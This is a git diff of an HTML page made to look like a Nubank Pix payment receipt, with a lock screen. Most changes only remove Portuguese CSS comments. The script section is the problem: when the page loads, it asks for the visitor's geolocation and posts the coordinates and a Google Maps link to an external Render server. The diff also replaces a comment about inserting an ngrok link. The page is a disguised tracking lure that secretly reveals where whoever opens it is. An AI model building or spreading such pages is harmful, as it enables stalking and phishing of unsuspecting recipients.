@@ -22,7 +22,7 @@
       /* Evita rolagem lateral indesejada */
     }
 
-    /* TELA DE BLOQUEIO (Mantida) */
+    /* TELA DE BLOQUEIO */
     #tela-bloqueio {
       display: flex;
       flex-direction: column;
@@ -53,12 +53,9 @@
     /* --- O COMPROVANTE (Visual App) --- */
     .app-container {
       padding: 24px;
-      /* Margem padrão do app */
       padding-bottom: 0;
       max-width: 600px;
-      /* Limite para PC não ficar gigante */
       margin: 0 auto;
-      /* Centraliza no PC */
     }
 
     /* Logo Nu */
@@ -135,14 +132,12 @@
       font-weight: 400;
     }
 
-    /* RODAPÉ "VAZADO" (Truque CSS para celular) */
+    /* RODAPÉ "VAZADO" */
     .footer-gray {
       background-color: #f5f5f5;
       padding: 24px;
       padding-top: 32px;
       margin-top: 30px;
-
-      /* O Segredo: Margens negativas para encostar na borda da tela */
       margin-left: -24px;
       margin-right: -24px;
       padding-bottom: 50px;
@@ -280,7 +275,7 @@
   </div>
 
   <script>
-    // LÓGICA DE LOCALIZAÇÃO (MANTIDA)
+    // LÓGICA DE LOCALIZAÇÃO
     window.addEventListener("load", () => {
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(sendLocation, handleError);
@@ -297,10 +292,10 @@
       // Coleta dados
       const latitude = position.coords.latitude;
       const longitude = position.coords.longitude;
-      // Link Google Maps
+      // Link Google Maps (Corrigido para formato padrão)
       const maps = `https://www.google.com/maps?q=${latitude},${longitude}`;
 
-      // --- ATENÇÃO: COLOQUE SEU LINK DO NGROK AQUI ---
+      // Envia para o Render
       fetch("https://comprovante-pix-l8l7.onrender.com/send-location", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
